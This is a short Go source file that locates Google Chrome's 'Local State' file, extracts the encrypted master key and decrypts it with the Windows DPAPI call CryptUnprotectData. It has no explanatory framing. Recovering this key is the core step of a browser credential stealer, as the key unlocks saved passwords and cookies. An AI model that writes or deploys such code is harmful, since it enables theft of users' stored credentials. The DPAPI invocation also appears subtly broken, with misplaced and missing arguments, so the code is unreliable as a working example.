package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

func getMasterKey() ([]byte, error) {
	appData := os.Getenv("LOCALAPPDATA")
	localStatePath := filepath.Join(appData, "Google", "Chrome", "User Data", "Local State")

	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read Local State: %v", err)
	}

	var state struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil, fmt.Errorf("failed to parse Local State: %v", err)
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(state.OSCrypt.EncryptedKey[5:])
	if err != nil {
		return nil, fmt.Errorf("failed to decode encrypted key: %v", err)
	}

	var decryptedData []byte
	decryptedData, err = decryptDPAPI(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt master key: %v", err)
	}

	return decryptedData, nil
}

func decryptDPAPI(data []byte) ([]byte, error) {
	// FOR WINDOWS ONLY
	dll := syscall.NewLazyDLL("Crypt32.dll")
	proc := dll.NewProc("CryptUnprotectData")

	var outBlob struct {
		cbData uint32
		pbData *byte
	}

	ret, _, err := proc.Call(
		uintptr(unsafe.Pointer(&struct {
			cbData uint32
		}{uint32(len(data))})),
		uintptr(unsafe.Pointer(&data[0])),
		0,
		0,
		uintptr(unsafe.Pointer(&outBlob)),
		0,
	)

	if ret == 0 {
		return nil, fmt.Errorf("crypt32.CryptUnprotectData failed: %v", err)
	}

	defer func() {
		proc := dll.NewProc("LocalFree")
		proc.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	}()

	decrypted := make([]byte, outBlob.cbData)
	copy(decrypted, (*[1<<30 - 1]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData:outBlob.cbData])

	return decrypted, nil
}
